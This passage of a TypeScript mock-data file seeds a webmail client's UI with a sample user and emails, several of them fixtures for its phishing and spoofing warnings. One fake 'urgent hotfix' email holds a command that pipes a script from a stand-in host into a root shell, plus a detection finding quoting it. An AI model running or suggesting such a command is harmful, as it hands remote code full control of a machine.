import dayjs from 'dayjs'
import type {
  EmailDetail,
  GroupOption,
  MailAuthStatus,
  MailRiskAssessment,
  MailSpamAssessment,
  MailVerificationCode,
  MailboxAddress,
  UserProfile,
} from '@/api'

export interface MockEmailRecord {
  mailbox_address_ids?: number[]
  catch_all_addresses?: string[]
  id: number
  type: number // 0 received, 1 sent
  status: number // 0 inbox, 1 sent, 3 deleted, 4 draft, 5 junk
  group_id: number
  prev_status?: number
  prev_group_id?: number
  deleted_at?: number | null
  is_read: boolean
  is_starred?: boolean
  dangerous: boolean
  auth_status?: MailAuthStatus
  spam?: MailSpamAssessment | null
  risk?: MailRiskAssessment
  verification_code?: MailVerificationCode | null
  error: string
  subject: string
  from_name: string
  from_address: string
  to: { Name: string; EmailAddress: string }[]
  cc: { Name: string; EmailAddress: string }[]
  reply_to: { Name: string; EmailAddress: string }[]
  send_date: string
  text: string
  html: string
  text_format?: 'plain' | 'flowed' | 'markdown' | 'patch'
  has_code?: boolean
  size: number
  msg_id: string
  attachments: {
    Filename: string
    ContentType: string
    Index: number
    Size: number
    previewContent?: string
  }[]
}

export const MOCK_USER: UserProfile = {
  id: 1,
  account: 'admin',
  name: '林深',
  display_name: '林深',
  disabled: 0,
  is_admin: 1,
  quota_mb: 2048,
  used_bytes: 342 * 1024 * 1024,
  lang: 'zh-CN',
  created: '2026-09-01T08:00:00Z',
  last_login_at: dayjs().subtract(18, 'minute').toISOString(),
  addresses: [
    {
      id: 1,
      user_id: 1,
      local_part: 'admin',
      domain_id: 1,
      is_primary: true,
      can_send: true,
      status: 'active',
      requested_at: '2026-09-01T08:00:00Z',
      reviewed_at: '2026-09-01T08:00:00Z',
      reviewed_by: 1,
      reject_reason: '',
      domain: 'pmail.dev',
      address: 'admin@pmail.dev',
      created: '2026-09-01T08:00:00Z',
    },
    {
      id: 2,
      user_id: 1,
      local_part: 'lin',
      domain_id: 1,
      is_primary: false,
      can_send: true,
      status: 'active',
      requested_at: '2026-09-10T10:30:00Z',
      reviewed_at: '2026-09-10T10:35:00Z',
      reviewed_by: 1,
      reject_reason: '',
      domain: 'pmail.dev',
      address: 'lin@pmail.dev',
      created: '2026-09-10T10:30:00Z',
    },
    {
      id: 3,
      user_id: 1,
      local_part: 'noreply',
      domain_id: 1,
      is_primary: false,
      can_send: false,
      status: 'active',
      requested_at: '2026-10-05T14:20:00Z',
      reviewed_at: '2026-10-05T14:25:00Z',
      reviewed_by: 1,
      reject_reason: '',
      domain: 'pmail.dev',
      address: 'noreply@pmail.dev',
      created: '2026-10-05T14:20:00Z',
    },
    {
      id: 4,
      user_id: 1,
      local_part: 'billing-ops',
      domain_id: 1,
      is_primary: false,
      can_send: false,
      status: 'pending',
      requested_at: dayjs().subtract(2, 'hour').toISOString(),
      reviewed_at: null,
      reviewed_by: null,
      reject_reason: '',
      domain: 'pmail.dev',
      address: 'billing-ops@pmail.dev',
      created: dayjs().subtract(2, 'hour').toISOString(),
    },
    {
      id: 5,
      user_id: 1,
      local_part: 'postmaster',
      domain_id: 1,
      is_primary: false,
      can_send: false,
      status: 'rejected',
      requested_at: dayjs().subtract(2, 'day').toISOString(),
      reviewed_at: dayjs().subtract(1, 'day').toISOString(),
      reviewed_by: 1,
      reject_reason: '系统保留前缀，不支持作为个人收发别名',
      domain: 'pmail.dev',
      address: 'postmaster@pmail.dev',
      created: dayjs().subtract(2, 'day').toISOString(),
    },
  ],
}

export const MOCK_ADDRESSES: MailboxAddress[] = MOCK_USER.addresses ?? []

export const INITIAL_CUSTOM_GROUPS: GroupOption[] = [
  { id: 10, name: '工作项目', parent_id: 0, full_path: '/工作项目' },
  { id: 11, name: '账单通知', parent_id: 0, full_path: '/账单通知' },
  { id: 12, name: 'GitHub', parent_id: 0, full_path: '/GitHub' },
]

function minutesAgo(mins: number): string {
  return dayjs().subtract(mins, 'minute').format('YYYY-MM-DD HH:mm:ss')
}

function hoursAgo(hours: number): string {
  return dayjs().subtract(hours, 'hour').format('YYYY-MM-DD HH:mm:ss')
}

function daysAgo(days: number): string {
  return dayjs().subtract(days, 'day').format('YYYY-MM-DD HH:mm:ss')
}

export function createSeedEmails(): MockEmailRecord[] {
  return [
    {
      id: 211,
      type: 0,
      status: 0,
      group_id: 0,
      is_read: false,
      dangerous: false,
      auth_status: 'pass',
      error: '',
      subject: '[pmail/pmail] Release v0.0.8 tag published',
      from_name: 'GitHub',
      from_address: 'notifications@github.com',
      to: [{ Name: '林深', EmailAddress: 'admin@pmail.dev' }],
      cc: [],
      reply_to: [],
      send_date: minutesAgo(1),
      size: 2860,
      msg_id: '<20261124.gh.release@github.com>',
      text: 'Tag v0.0.8 has been published to pmail/pmail with all CI checks passing.',
      html: '<p>Tag <strong>v0.0.8</strong> has been published to <code>pmail/pmail</code> with all CI checks passing.</p>',
      attachments: [],
      risk: { level: 'none', findings: [] },
    },
    {
      id: 212,
      type: 0,
      status: 0,
      group_id: 0,
      is_read: false,
      dangerous: false,
      auth_status: 'pass',
      error: '',
      subject: 'Cloudflare: SSL/TLS certificate renewed for pmail.dev',
      from_name: 'Cloudflare',
      from_address: 'noreply@notify.cloudflare.com',
      to: [{ Name: '林深', EmailAddress: 'admin@pmail.dev' }],
      cc: [],
      reply_to: [],
      send_date: minutesAgo(2),
      size: 2410,
      msg_id: '<20261124.cf.ssl@notify.cloudflare.com>',
      text: 'Your Universal SSL certificate for pmail.dev has been renewed automatically.',
      html: '<p>Your Universal SSL certificate for <strong>pmail.dev</strong> has been renewed automatically.</p>',
      attachments: [],
      risk: { level: 'none', findings: [] },
    },
    {
      id: 213,
      type: 0,
      status: 0,
      group_id: 0,
      is_read: false,
      dangerous: false,
      auth_status: 'pass',
      error: '',
      subject: 'Oracle Cloud: Monthly Always Free resource summary',
      from_name: 'Oracle Cloud',
      from_address: 'noreply@oracle.com',
      to: [{ Name: '林深', EmailAddress: 'admin@pmail.dev' }],
      cc: [],
      reply_to: [],
      send_date: minutesAgo(2),
      size: 2180,
      msg_id: '<20261124.oci.summary@oracle.com>',
      text: 'Your Oracle Cloud Infrastructure Always Free instances are running normally.',
      html: '<p>Your Oracle Cloud Infrastructure Always Free instances are running normally.</p>',
      attachments: [],
      risk: { level: 'none', findings: [] },
    },
    {
      id: 214,
      type: 0,
      status: 0,
      group_id: 0,
      is_read: false,
      dangerous: true,
      auth_status: 'fail',
      error: '',
      subject: '【高危伪造】GitHub 账号异常，请立即验证您的访问令牌',
      from_name: 'GitHub Security',
      from_address: 'security@github.com',
      to: [{ Name: '林深', EmailAddress: 'admin@pmail.dev' }],
      cc: [],
      reply_to: [],
      send_date: minutesAgo(3),
      size: 1920,
      msg_id: '<20261124.spoof.gh@untrusted.example>',
      text: '此封邮件伪造了 github.com 发件地址且未通过 DMARC/SPF/DKIM 验证，系统不会显示 GitHub 品牌头像。',
      html: '<p>此封邮件伪造了 <code>github.com</code> 发件地址且未通过 DMARC/SPF/DKIM 验证，系统不会显示 GitHub 品牌头像。</p>',
      attachments: [],
      risk: { level: 'none', findings: [] },
    },
    {
      id: 215,
      type: 0,
      status: 0,
      group_id: 0,
      is_read: false,
      dangerous: false,
      auth_status: 'pass',
      error: '',
      subject: 'Account review notice from evilgithub.com',
      from_name: 'GitHub Alerts',
      from_address: 'alerts@evilgithub.com',
      to: [{ Name: '林深', EmailAddress: 'admin@pmail.dev' }],
      cc: [],
      reply_to: [],
      send_date: minutesAgo(3),
      size: 1740,
      msg_id: '<20261124.lookalike@evilgithub.com>',
      text: 'This message comes from lookalike domain evilgithub.com and must never match GitHub.',
      html: '<p>This message comes from lookalike domain <code>evilgithub.com</code> and must never match GitHub.</p>',
      attachments: [],
      risk: { level: 'none', findings: [] },
    },
    {
      id: 201,
      type: 0,
      status: 0,
      group_id: 0,
      is_read: false,
      dangerous: false,
      error: '',
      subject: '【PMail Cloud】您的登录验证码为 849201',
      from_name: 'PMail Cloud 安全中心',
      from_address: 'security@acme-cloud.cn',
      to: [{ Name: '林深', EmailAddress: 'admin@pmail.dev' }],
      cc: [],
      reply_to: [],
      send_date: minutesAgo(3),
      size: 3280,
      msg_id: '<20261123.otp.849201@acme-cloud.cn>',
      text: '您好，您正在尝试从新设备登录 PMail Cloud 控制台。本次一次性验证码为 849201，10 分钟内有效。如非本人操作，请立即修改密码并检查 API 令牌。',
      html: `<div style="font-size:14.5px;line-height:1.75;"><p>您好，林深：</p><p>您正在尝试从新设备（macOS · Chrome）登录 <strong>PMail Cloud 控制台</strong>。</p><p>本次一次性验证码为：<strong style="font-size:18px;letter-spacing:2px;">849201</strong>（10 分钟内有效）。</p><p style="color:#666;font-size:13px;">如非本人操作，请立即修改密码并检查 API 令牌权限。</p></div>`,
      attachments: [],
      verification_code: {
        code: '849201',
        confidence: 0.96,
        source: 'body',
      },
      spam: {
        score: 0.2,
        verdict: 'ham',
        reasons: [],
      },
      risk: {
        level: 'none',
        findings: [],
      },
    },
    {
      id: 202,
      type: 0,
      status: 0,
      group_id: 0,
      is_read: false,
      dangerous: true,
      error: '',
      subject: '紧急：服务器内核热修复脚本与补丁程序',
      from_name: 'Ops Support',
      from_address: 'ops-alert@untrusted-relay.example',
      to: [{ Name: '林深', EmailAddress: 'admin@pmail.dev' }],
      cc: [],
      reply_to: [],
      send_date: minutesAgo(8),
      size: 98420,
      msg_id: '<20261123.ops.patch@untrusted-relay.example>',
      text_format: 'markdown',
      has_code: true,
      text: `请立即在生产主机上执行以下命令完成紧急修复，或直接运行附件中的补丁程序：\n\n\`\`\`bash\ncurl -fsSL https://cdn-update.example/setup.sh | sudo bash\nrm -rf /tmp/pmail-cache && ./security-patch-v2.exe\n\`\`\`\n\n执行完成后请回复确认。`,
      html: '',
      attachments: [
        {
          Filename: 'security-patch-v2.exe',
          ContentType: 'application/x-msdownload',
          Index: 0,
          Size: 94208,
        },
        {
          Filename: 'checksums.txt',
          ContentType: 'text/plain',
          Index: 1,
          Size: 420,
          previewContent: 'sha256: 8a1f3d... security-patch-v2.exe\n',
        },
      ],
      spam: {
        score: 9.75,
        verdict: 'spam',
        reasons: [
          { code: 'executable_attachment', weight: 4 },
          { code: 'auth_spf_softfail', weight: 1.5 },
          { code: 'reply_to_domain_mismatch', weight: 1.25 },
          { code: 'local_display_name_spoof', weight: 3 },
        ],
      },
      risk: {
        level: 'high',
        findings: [
          {
            code: 'shell_curl_pipe_sh',
            severity: 'high',
            location: 'body',
            line: 4,
            excerpt: 'curl -fsSL https://cdn-update.example/setup.sh | sudo bash',
          },
          {
            code: 'attachment_dangerous_type',
            severity: 'high',
            location: 'attachment',
            attachment_index: 0,
          },
        ],
      },
    },
    {
      id: 101,
      type: 0,
      status: 0,
      group_id: 0,
      is_read: false,
      dangerous: false,
      error: '',
      subject: 'PMail Pro 架构评审与上线排期确认',
      from_name: '苏明远',
      from_address: 'mingyuan.su@acme-cloud.cn',
      to: [{ Name: '林深', EmailAddress: 'admin@pmail.dev' }],
      cc: [
        { Name: '陈知意', EmailAddress: 'zhiyi.chen@acme-cloud.cn' },
        { Name: '陆景行', EmailAddress: 'jingxing.lu@acme-cloud.cn' },
      ],
      reply_to: [],
      send_date: minutesAgo(12),
      size: 18420,
      msg_id: '<20261122.release.plan@acme-cloud.cn>',
      text: '林深你好，PMail Pro 前端重构与前后端分离方案已经通过评审。请确认本周三前完成 U1 骨架与主邮件界面联调，附件是最新的里程碑排期和 OpenAPI 接口对照表。',
      html: `
        <div style="font-size:14.5px;line-height:1.75;">
          <p>林深你好，</p>
          <p>PMail Pro <strong>0.0.1</strong> 的架构评审已全部通过，核心目标如下：</p>
          <ul>
            <li>前后端彻底分离，仅通过 <code>/api/*</code> 与 <code>docs/openapi.yaml</code> 契约交互</li>
            <li>全新 React 19 + TanStack Virtual 邮件工作区，保障 <strong>10,000+ 封邮件 60fps 流畅滚动</strong></li>
            <li>首次部署引入一次性注册密钥（<code>XXXX-XXXX-XXXX-XXXX</code>），提升默认安全性</li>
            <li>域名管理新增分步 DNS 记录向导与实时解析检测</li>
          </ul>
          <p>请核对附件中的排期文档与配置文件，如无异议我们将在明天上午 10:00 开始联调。</p>
          <p style="margin-top:16px;">
            <img src="https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?w=680&q=80" alt="PMail Pro 架构示意图" />
          </p>
          <p style="color:#64748b;font-size:13px;margin-top:18px;">— 苏明远 · 技术产品负责人</p>
        </div>
      `,
      attachments: [
        {
          Filename: 'PMail-Pro-Milestone.md',
          ContentType: 'text/markdown',
          Index: 0,
          Size: 4280,
          previewContent: `# PMail Pro 里程碑排期\n\n- C1: OpenAPI 契约 + 静态托管 + /api/bootstrap\n- U1: React 19 骨架 + 登录/注册 + 主邮件三栏工作区\n- C2: 首次注册密钥 + 后端提示全中文\n- C3: DNS 引导接口 + 邮件代码解析\n- U2: 设置与管理页面 + DNS 分步向导\n- U3: Shiki 代码高亮 + 性能与动效打磨\n`,
        },
        {
          Filename: 'dns-preview.json',
          ContentType: 'application/json',
          Index: 1,
          Size: 1620,
          previewContent: JSON.stringify(
            {
              domain: 'pmail.dev',
              mail_host: 'mail.pmail.dev',
              records: [
                { type: 'MX', host: '@', value: 'mail.pmail.dev', priority: 10, status: 'ok' },
                { type: 'TXT', host: '@', value: 'v=spf1 mx ~all', status: 'ok' },
              ],
            },
            null,
            2,
          ),
        },
      ],
    },
    {
      id: 102,
      type: 0,
      status: 0,
      group_id: 0,
      is_read: false,
      dangerous: false,
      error: '',
      subject: '[GitHub] PR #412: feat(http): 静态目录托管与 SPA 路由回退',
      from_name: 'GitHub',
      from_address: 'notifications@github.com',
      to: [{ Name: '林深', EmailAddress: 'admin@pmail.dev' }],
      cc: [],
      reply_to: [{ Name: 'GitHub Reply', EmailAddress: 'reply+pr412@reply.github.com' }],
      send_date: minutesAgo(26),
      size: 11840,
      msg_id: '<pr-412-pmail@github.com>',
      text_format: 'plain',
      has_code: true,
      text: '@codex-dev requested your review on PR #412: 移除 go:embed 并改为 PMAIL_WEB_ROOT 静态目录托管，支持缓存头与 /api/bootstrap 引导接口。',
      html: `
        <div>
          <p><strong>@codex-dev</strong> 请求你审阅 <code>pmail/pmail#412</code>：</p>
          <blockquote>移除 <code>//go:embed dist/*</code>，新增 <code>PMAIL_WEB_ROOT</code> 环境变量与 SPA 回退策略。</blockquote>
          <pre><code class="language-go">func serveWebRoot(root string) http.Handler {
	fsys := http.Dir(root)
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if strings.HasPrefix(r.URL.Path, "/assets/") {
			w.Header().Set("Cache-Control", "public, max-age=31536000, immutable")
		}
		http.FileServer(fsys).ServeHTTP(w, r)
	})
}</code></pre>
          <p>GitHub 通知表格差异预览（保留原表格排版）：</p>
          <table style="width:100%;border:1px solid rgba(148,163,184,0.25);font-family:ui-monospace,monospace;font-size:12px;">
            <tr style="background:rgba(244,63,94,0.12);"><td style="padding:3px 8px;width:32px;opacity:0.6;">14</td><td style="padding:3px 8px;"><code>- //go:embed dist/*</code></td></tr>
            <tr style="background:rgba(16,185,129,0.14);"><td style="padding:3px 8px;width:32px;opacity:0.6;">14</td><td style="padding:3px 8px;"><code>+ webRoot := config.WebRoot() // 默认 /work/web</code></td></tr>
          </table>
          <p style="margin-top:12px;">查看完整变更：<a href="https://github.com/Jinnrry/PMail">github.com/Jinnrry/PMail/pull/412</a></p>
        </div>
      `,
      attachments: [
        {
          Filename: 'spa-fallback.diff',
          ContentType: 'text/x-diff',
          Index: 0,
          Size: 2140,
          previewContent: `diff --git a/server/listen/http_server/static.go b/server/listen/http_server/static.go\n--- a/server/listen/http_server/static.go\n+++ b/server/listen/http_server/static.go\n@@ -12,6 +12,12 @@ func ServeSPA(root string) http.Handler {\n+\tif strings.HasPrefix(r.URL.Path, "/assets/") {\n+\t\tw.Header().Set("Cache-Control", "public, max-age=31536000, immutable")\n+\t} else {\n+\t\tw.Header().Set("Cache-Control", "no-cache")\n+\t}\n`,
        },
        {
          Filename: 'verify_dns.py',
          ContentType: 'text/x-python',
          Index: 1,
          Size: 1480,
          previewContent: `#!/usr/bin/env python3\n"""检查域名的 MX / SPF / DKIM 解析记录（含中文注释测试）"""\n\nimport dns.resolver\n\ndef check_mx(domain: str) -> list[str]:\n    answers = dns.resolver.resolve(domain, "MX")\n    return sorted(f"{r.preference} {r.exchange}" for r in answers)\n\nif __name__ == "__main__":\n    print("检测结果:", check_mx("pmail.dev"))\n`,
        },
      ],
    },
    {
      id: 113,
      type: 0,
      status: 0,
      group_id: 0,
      is_read: false,
      dangerous: false,
      error: '',
      subject: '[PATCH 1/2] mail: 支持 GBK/GB18030 纯文本解码与 format=flowed',
      from_name: '陆景行',
      from_address: 'jingxing.lu@acme-cloud.cn',
      to: [{ Name: '林深', EmailAddress: 'admin@pmail.dev' }],
      cc: [],
      reply_to: [],
      send_date: minutesAgo(38),
      size: 4620,
      msg_id: '<patch-001@acme-cloud.cn>',
      text_format: 'patch',
      has_code: true,
      text: `From 9f2c8d1a4b5e67890abcdef1234567890abcdef1 Mon Sep 17 00:00:00 2001
From: Lu Jingxing <jingxing.lu@acme-cloud.cn>
Date: Sun, 22 Nov 2026 21:30:00 +0800
Subject: [PATCH 1/2] mail: 支持 GBK/GB18030 纯文本解码与 format=flowed

修复中文老旧客户端发送 GBK 编码代码邮件时的乱码问题，并在展开
format=flowed 软换行时保持代码缩进不被破坏。
---
 server/dto/parsemail/charset.go | 14 ++++++++++++--
 server/dto/parsemail/flowed.go  |  9 +++++++++
 2 files changed, 21 insertions(+), 2 deletions(-)

diff --git a/server/dto/parsemail/charset.go b/server/dto/parsemail/charset.go
index 1a2b3c4..8d9e0f1 100644
--- a/server/dto/parsemail/charset.go
+++ b/server/dto/parsemail/charset.go
@@ -18,8 +18,18 @@ func DecodeBody(raw []byte, charset string) string {
-\tif charset == "" {
-\t\treturn string(raw)
+\tlower := strings.ToLower(strings.TrimSpace(charset))
+\tswitch lower {
+\tcase "gbk", "gb2312", "gb18030":
+\t\tif out, err := simplifiedchinese.GB18030.NewDecoder().Bytes(raw); err == nil {
+\t\t\treturn string(out)
+\t\t}
+\tcase "big5":
+\t\tif out, err := traditionalchinese.Big5.NewDecoder().Bytes(raw); err == nil {
+\t\t\treturn string(out)
+\t\t}
 \t}
 \treturn string(raw)
 }
diff --git a/server/dto/parsemail/flowed.go b/server/dto/parsemail/flowed.go
new file mode 100644
index 0000000..4455667
--- /dev/null
+++ b/server/dto/parsemail/flowed.go
@@ -0,0 +1,9 @@
+package parsemail
+
+// UnwrapFlowed 仅在非代码缩进行展开 RFC 3676 软换行
+func UnwrapFlowed(input string, delSp bool) string {
+	if strings.HasPrefix(input, "    ") || strings.HasPrefix(input, "\t") {
+		return input
+	}
+	return unwrapSoftBreaks(input, delSp)
+}


`,
      html: '',
      attachments: [],
    },
    {
      id: 114,
      type: 0,
      status: 0,
      group_id: 0,
      is_read: false,
      dangerous: false,
      error: '',
      subject: '前端代码高亮与 Markdown 邮件渲染规范（含 TypeScript / Python 示例）',
      from_name: '陈知意',
      from_address: 'zhiyi.chen@acme-cloud.cn',
      to: [{ Name: '林深', EmailAddress: 'admin@pmail.dev' }],
      cc: [],
      reply_to: [],
      send_date: minutesAgo(54),
      size: 5120,
      msg_id: '<markdown-code-spec@acme-cloud.cn>',
      text_format: 'markdown',
      has_code: true,
      text: `## PMail Pro 邮件代码渲染说明

当邮件为 **Markdown** 或包含代码围栏时，前端按需懒加载 \`Shiki\` 语法高亮引擎，并自动适配浅色/深色主题：

### 1. TypeScript 乐观更新示例

\`\`\`typescript
interface MailMutationOptions {
  ids: number[]
  starred: boolean
}

export async function toggleStarred(opts: MailMutationOptions): Promise<void> {
  // 调用后端 POST /api/email/star，并在失败时自动回滚缓存
  await mailApi.star(opts.ids, opts.starred)
}
\`\`\`

### 2. GBK 解码后的中文注释 Python 脚本

\`\`\`python
def 汇总收件箱状态(total: int, unread: int) -> str:
    """支持中文标识符与 GBK 解码后的完整注释展示"""
    ratio = (unread / total * 100) if total > 0 else 0.0
    return f"收件箱共 {total} 封，未读 {unread} 封（占比 {ratio:.1f}%）"
\`\`\`

> 在线文档参考：https://github.com/dingding229/PMail/blob/master/docs/API.md`,
      html: '',
      attachments: [],
    },
    {
      id: 103,
      type: 0,
      status: 0,
      group_id: 0,
      is_read: false,
      dangerous: false,
      error: '',
      subject: '2026 年 11 月云服务器账单与电子发票已开具',
      from_name: '云栖账单中心',
      from_address: 'billing@cloudops.cn',
      to: [{ Name: '林深', EmailAddress: 'admin@pmail.dev' }],
      cc: [],
      reply_to: [],
      send_date: hoursAgo(3),
      size: 14200,
      msg_id: '<inv-202611-8832@cloudops.cn>',
      text: '尊敬的客户，您 2026 年 11 月的云服务器（新加坡节点 2C4G）账单金额为 ¥128.00，已自动扣款成功。电子发票 PDF 见附件。',
      html: `
        <div>
          <p>尊敬的 <strong>林深</strong>，您好：</p>
          <p>您本周期的云资源账单已结算完成，明细如下：</p>
          <table style="width:100%;border:1px solid #cbd5e1;margin:12px 0;">
            <tr style="background:rgba(148,163,184,0.12);">
              <th style="text-align:left;padding:8px 12px;">计费项</th>
              <th style="text-align:left;padding:8px 12px;">周期</th>
              <th style="text-align:right;padding:8px 12px;">金额</th>
            </tr>
            <tr>
              <td style="padding:8px 12px;">轻量应用服务器 SG-01（含固定 IPv4）</td>
              <td style="padding:8px 12px;">2026-11-01 ~ 2026-11-30</td>
              <td style="text-align:right;padding:8px 12px;font-weight:600;">¥128.00</td>
            </tr>
          </table>
          <p>电子发票已随附于本邮件中，如需重新开具请前往控制台。</p>
        </div>
      `,
      attachments: [
        {
          Filename: 'Invoice-2026-11.pdf',
          ContentType: 'application/pdf',
          Index: 0,
          Size: 186400,
        },
      ],
    },
    {
      id: 104,
      type: 0,
      status: 0,
      group_id: 0,
      is_read: true,
      dangerous: false,
      error: '',
      subject: '本周五产品设计走查会议纪要与视觉规范更新',
      from_name: '陈知意',
      from_address: 'zhiyi.chen@acme-cloud.cn',
      to: [{ Name: '林深', EmailAddress: 'admin@pmail.dev' }],
      cc: [{ Name: '苏明远', EmailAddress: 'mingyuan.su@acme-cloud.cn' }],
      reply_to: [],
      send_date: hoursAgo(6),
      size: 7600,
      msg_id: '<design-sync-1122@acme-cloud.cn>',
      text: '今天走查了新版邮件三栏的字号层级和暗色模式对比度。结论：正文 14.5px 行高 1.7、侧栏紧凑但留足呼吸感、未读蓝点克制不刺眼。',
      html: `
        <div>
          <p>Hi 林深，</p>
          <p>附上今天设计走查的关键共识：</p>
          <ol>
            <li><strong>中文字体渲染</strong>：优先 <code>PingFang SC</code> / <code>Microsoft YaHei</code>，数字时间统一启用 <code>tabular-nums</code>。</li>
            <li><strong>列表密度</strong>：三行结构（发件人+时间 / 主题 / 单行摘要），保持 Apple Mail 与 Superhuman 之间的平衡感。</li>
            <li><strong>暗色模式</strong>：使用深蓝灰层次区分侧栏、列表与阅读窗格，避免纯黑高反差刺眼。</li>
          </ol>
          <p>下周一再一起过一遍手机端手势交互！</p>
        </div>
      `,
      attachments: [],
    },
    {
      id: 105,
      type: 0,
      status: 0,
      group_id: 0,
      is_read: false,
      dangerous: true,
      error: '',
      subject: '【安全提醒】检测到异常登录尝试，请立即核验账户',
      from_name: 'Account Security',
      from_address: 'security-alert@unverified-relay.xyz',
      to: [{ Name: '林深', EmailAddress: 'admin@pmail.dev' }],
      cc: [],
      reply_to: [],
      send_date: hoursAgo(9),
      size: 3200,
      msg_id: '<spoof-test-001@unverified-relay.xyz>',
      text: '这是一封未通过 SPF 和 DKIM 校验的测试邮件，用于验证前端安全警示条展示效果。请勿轻信来历不明的账户核验链接。',
      html: '',
      attachments: [],
    },
    {
      id: 106,
      type: 0,
      status: 0,
      group_id: 0,
      is_read: true,
      dangerous: false,
      error: '',
      subject: 'Let’s Encrypt SSL 证书自动续期成功通知（mail.pmail.dev）',
      from_name: 'ACME Bot',
      from_address: 'certbot@pmail.dev',
      to: [{ Name: '林深', EmailAddress: 'admin@pmail.dev' }],
      cc: [],
      reply_to: [],
      send_date: daysAgo(1),
      size: 2940,
      msg_id: '<acme-renew-20261121@pmail.dev>',
      text: '域名 mail.pmail.dev 的 TLS 证书已通过 HTTP-01 自动续期，新证书有效期至 2027-02-19，SMTP STARTTLS 与 HTTPS 服务均已热重载。',
      html: `
        <div>
          <p>您的服务器证书已自动续期成功：</p>
          <ul>
            <li><strong>域名</strong>：<code>mail.pmail.dev</code></li>
            <li><strong>颁发机构</strong>：Let’s Encrypt E6</li>
            <li><strong>有效期至</strong>：2027-02-19 03:14:22 UTC</li>
            <li><strong>已重载服务</strong>：HTTPS (443) / SMTPS (465) / IMAPS (993)</li>
          </ul>
        </div>
      `,
      attachments: [],
    },
    {
      id: 107,
      type: 0,
      status: 0,
      group_id: 0,
      is_read: true,
      dangerous: false,
      error: '',
      subject: '前端周刊 #218：React 19 性能实践与虚拟列表调优',
      from_name: '前端精读周刊',
      from_address: 'digest@fe-weekly.io',
      to: [{ Name: '林深', EmailAddress: 'admin@pmail.dev' }],
      cc: [],
      reply_to: [],
      send_date: daysAgo(2),
      size: 16500,
      msg_id: '<weekly-218@fe-weekly.io>',
      text: '本期精选：1. TanStack Virtual 动态高度测量避坑指南；2. Tailwind CSS v4 零配置主题变量；3. 现代 Webmail 快捷键交互设计。',
      html: `
        <div>
          <h2 style="margin-top:0;">前端精读周刊 #218</h2>
          <p>精选本周值得细读的三篇工程文章：</p>
          <ul>
            <li><strong>万级数据列表 60fps 实战</strong>：结合无限分页与预取策略，消除滚动白屏。</li>
            <li><strong>Tailwind CSS v4 CSS-First 令牌体系</strong>：用原生 CSS 变量统一亮暗主题。</li>
            <li><strong>无障碍键盘导航设计</strong>：让重度邮箱用户双手不离键盘。</li>
          </ul>
          <p><img src="https://images.unsplash.com/photo-1555066931-4365d14bab8c?w=640&q=80" alt="封面图" /></p>
        </div>
      `,
      attachments: [],
    },
    {
      id: 108,
      type: 0,
      status: 0,
      group_id: 10,
      is_read: false,
      dangerous: false,
      error: '',
      subject: '新加坡节点压测报告：万封收件箱并发读取 P99 < 35ms',
      from_name: '陆景行',
      from_address: 'jingxing.lu@acme-cloud.cn',
      to: [{ Name: '林深', EmailAddress: 'admin@pmail.dev' }],
      cc: [],
      reply_to: [],
      send_date: daysAgo(2),
      size: 6100,
      msg_id: '<bench-sg-01@acme-cloud.cn>',
      text: '刚刚在测试环境灌入了 10,000 封模拟邮件，SQLite WAL 模式下列表接口 P99 为 28ms，详情接口 P99 为 11ms。',
      html: '',
      attachments: [],
    },
    {
      id: 109,
      type: 1,
      status: 1,
      group_id: 0,
      is_read: true,
      dangerous: false,
      error: '',
      subject: 'Re: PMail Pro 架构评审与上线排期确认',
      from_name: '林深',
      from_address: 'admin@pmail.dev',
      to: [{ Name: '苏明远', EmailAddress: 'mingyuan.su@acme-cloud.cn' }],
      cc: [{ Name: '陈知意', EmailAddress: 'zhiyi.chen@acme-cloud.cn' }],
      reply_to: [],
      send_date: hoursAgo(1),
      size: 4800,
      msg_id: '<sent-reply-101@pmail.dev>',
      text: '收到，排期没问题。今天晚上会把新前端骨架、主题切换、虚拟列表与富文本写信全部自测完毕，明早直接对接真实后端。',
      html: '<p>收到，排期没问题。今天晚上会把新前端骨架、主题切换、虚拟列表与富文本写信全部自测完毕，明早直接对接真实后端。</p>',
      attachments: [],
    },
    {
      id: 110,
      type: 1,
      status: 1,
      group_id: 0,
      is_read: true,
      dangerous: false,
      error: '550 5.1.1 User unknown in virtual mailbox table',
      subject: '合作方案同步（外发退信示例）',
      from_name: '林深',
      from_address: 'admin@pmail.dev',
      to: [{ Name: '测试收件人', EmailAddress: 'ghost@nonexistent-domain.example' }],
      cc: [],
      reply_to: [],
      send_date: daysAgo(3),
      size: 3100,
      msg_id: '<sent-bounce-110@pmail.dev>',
      text: '您好，附件为本次合作方案初稿，请查收。',
      html: '<p>您好，附件为本次合作方案初稿，请查收。</p>',
      attachments: [],
    },
    {
      id: 111,
      type: 0,
      status: 5,
      group_id: 0,
      is_read: false,
      dangerous: false,
      error: '',
      subject: '限时特惠：企业级营销群发通道 1 折起',
      from_name: '推广中心',
      from_address: 'promo@bulk-marketing.example',
      to: [{ Name: '林深', EmailAddress: 'admin@pmail.dev' }],
      cc: [],
      reply_to: [],
      send_date: daysAgo(4),
      size: 2400,
      msg_id: '<junk-111@bulk-marketing.example>',
      text: '高送达率营销通道限时优惠，点击退订。',
      html: '',
      attachments: [],
    },
    {
      id: 112,
      type: 0,
      status: 3,
      group_id: 0,
      prev_status: 0,
      prev_group_id: 0,
      deleted_at: dayjs().subtract(3, 'day').valueOf(),
      is_read: true,
      dangerous: false,
      error: '',
      subject: '构建通知：旧版镜像已归档',
      from_name: 'CI Bot',
      from_address: 'ci@pmail.dev',
      to: [{ Name: '林深', EmailAddress: 'admin@pmail.dev' }],
      cc: [],
      reply_to: [],
      send_date: daysAgo(6),
      size: 1950,
      msg_id: '<trash-112@pmail.dev>',
      text: '旧版发布工作流已完成并归档构建产物。',
      html: '',
      attachments: [],
    },
    {
      id: 113,
      type: 0,
      status: 3,
      group_id: 0,
      prev_status: 0,
      prev_group_id: 10,
      deleted_at: dayjs().subtract(22, 'day').valueOf(),
      is_read: false,
      dangerous: false,
      error: '',
      subject: '季度域名续费提醒（已处理）',
      from_name: 'Domain Registrar',
      from_address: 'billing@registrar.example',
      to: [{ Name: '林深', EmailAddress: 'admin@pmail.dev' }],
      cc: [],
      reply_to: [],
      send_date: daysAgo(25),
      size: 2680,
      msg_id: '<trash-113@registrar.example>',
      text: 'Your domain pmail.dev has been renewed for 1 year. Invoice #INV-2026-8841.',
      html: '<p>Your domain <strong>pmail.dev</strong> has been renewed for 1 year. Invoice #INV-2026-8841.</p>',
      attachments: [],
